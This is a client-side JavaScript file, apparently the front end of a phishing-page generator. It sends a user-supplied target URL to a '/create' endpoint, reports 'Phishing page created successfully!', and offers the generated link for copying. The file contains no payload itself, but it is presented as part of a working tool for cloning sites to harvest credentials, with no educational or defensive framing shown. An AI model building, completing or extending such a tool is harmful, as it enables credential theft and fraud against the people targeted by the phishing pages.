document.addEventListener('DOMContentLoaded', function() {
    const socket = io();
    
    // Create form submission
    document.getElementById('create-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const targetUrl = document.getElementById('target-url').value;
        const btn = this.querySelector('button[type="submit"]');
        const originalText = btn.textContent;
        
        btn.textContent = 'Creating...';
        btn.disabled = true;
        
        const formData = new FormData();
        formData.append('target_url', targetUrl);

        fetch('/create', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('result-url').value = window.location.origin + data.url;
                document.getElementById('result-container').classList.remove('d-none');
                document.getElementById('placeholder').classList.add('d-none');
                
                showNotification('Phishing page created successfully!', 'success');
                
                // Focus the input field
                document.getElementById('result-url').focus();
                document.getElementById('result-url').select();
            } else {
                showNotification('Error: ' + data.error, 'danger');
                document.getElementById('placeholder').classList.remove('d-none');
            }
        })
        .catch(error => {
            console.error('Fetch error:', error);
            showNotification('Connection error. Check console.', 'danger');
            document.getElementById('placeholder').classList.remove('d-none');
        })
        .finally(() => {
            btn.textContent = originalText;
            btn.disabled = false;
        });
    });
    
    // Copy URL functionality
    document.getElementById('copy-btn')?.addEventListener('click', function() {
        const urlInput = document.getElementById('result-url');
        urlInput.select();
        document.execCommand('copy');
        showNotification('URL copied to clipboard!', 'success');
    });
});

// Simple notification function
function showNotification(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    `;
    
    const container = document.querySelector('.container');
    container.insertBefore(alertDiv, container.firstChild);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}
